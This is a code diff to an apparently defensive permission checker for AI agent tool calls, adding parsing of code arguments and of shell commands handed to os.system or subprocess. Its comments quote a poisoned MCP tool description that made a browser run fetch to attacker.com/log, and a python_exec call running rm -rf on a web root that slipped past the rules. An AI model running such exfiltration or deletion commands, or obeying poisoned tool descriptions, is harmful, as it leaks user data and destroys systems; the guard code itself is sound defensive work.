@@ -1760,6 +1760,38 @@ def _tool_url_values(arguments, out: list[str], depth: int = 0) -> None:
             _tool_url_values(v, out, depth + 1)
 
 
+def _tool_code_values(arguments, depth: int = 0) -> list[str]:
+    """Strings in code arguments of a tool (TOOL_CODE_ARG_KEYS), at any depth."""
+    out: list[str] = []
+    if depth > 6:
+        return out
+    if isinstance(arguments, dict):
+        for k, v in arguments.items():
+            if str(k).lower() in TOOL_CODE_ARG_KEYS and isinstance(v, str) and v.strip():
+                out.append(v)
+            elif isinstance(v, (dict, list)):
+                out.extend(_tool_code_values(v, depth + 1))
+    elif isinstance(arguments, list):
+        for v in arguments:
+            out.extend(_tool_code_values(v, depth + 1))
+    return out
+
+
+_CODE_SHELL_STR_RE = re.compile(r"\b(?:os\.system|os\.popen|subprocess\.(?:run|call|check_call|check_output|Popen))\(\s*"
+                                r"(?:f|r|rb|b)?(['\"])(.+?)\1")
+_CODE_SHELL_LIST_RE = re.compile(r"\bsubprocess\.(?:run|call|check_call|check_output|Popen)\(\s*\[([^\]]+)\]")
+
+
+def _code_shell_commands(code: str) -> list[str]:
+    """The command lines code hands to the shell: a string given to os.system / subprocess, or a literal argv list."""
+    cmds = [m.group(2) for m in _CODE_SHELL_STR_RE.finditer(code)]
+    for m in _CODE_SHELL_LIST_RE.finditer(code):
+        parts = re.findall(r"(['\"])(.*?)\1", m.group(1))
+        if parts:
+            cmds.append(shlex.join(p for _, p in parts))
+    return cmds
+
+
 def _tool_code_urls(arguments, out: list[str], depth: int = 0) -> None:
     """Full URLs written inside code a tool runs (MCPTox, 2026-11-18: a poisoned description had a browser's evaluate
     run `fetch("https://attacker.com/log", ...)`, and the address escaped the HTTP rules because it was inside a
@@ -1917,6 +1949,19 @@ def _tool_reach(rec: dict, server: str, words: set[str], arguments, config: Conf
         for u in urls:
             ctx.add_url(u)
         rec = _merge(rec, ctx.finish())
+    if shell is None and not (words & TOOL_JS_WORDS):
+        # code a tool runs (python_exec code=..., run_code, a notebook cell) is read like `python -c`: deletes, writes,
+        # environment reads, network and process starts; a command it hands to os.system / subprocess meets the shell
+        # rules (v0.1.49, RULE-MINE-03: os.system('rm -rf /var/www/html/*') in python_exec was allowed)
+        for code in _tool_code_values(arguments):
+            ctx = _Ctx(config, None)
+            ctx.apply_inline_code(code)
+            rec = _merge(rec, ctx.finish())
+            for cmd in _code_shell_commands(code):
+                sh = normalize_shell(cmd, config, None)
+                parse_ok = rec["parse_ok"]
+                rec = _merge(rec, sh)
+                rec["parse_ok"] = parse_ok
     if shell is None and probe and not lookup:
         hosts = _tool_host_values(arguments)
         if hosts:
